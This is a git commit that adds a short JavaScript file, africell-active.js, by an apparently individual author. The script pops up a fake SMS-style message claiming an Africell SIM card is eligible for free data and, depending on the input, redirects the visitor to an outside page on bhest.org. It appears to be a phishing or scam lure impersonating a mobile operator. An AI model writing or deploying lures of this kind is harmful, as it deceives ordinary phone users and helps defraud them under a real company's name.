c7c3e463e36f9dd6a178a0eca5187d2db366d53d
surebanga <erongukpe@gmail.com>
2025-09-20 09:20:09 +0100

    Create africell-active.js

---
+++ africell-active.js
@@ -0,0 +1,5 @@
+var password = 'Activate 100GB'
+password=prompt('SMS: Congratulations, your Africell SIM card is eligible to receive free data old sim card reward, click OK to activate now','Activate 100GB');
+if (password != 'Activate 100GB') {
+location.href='https://bhest.org/africell.html';
+}
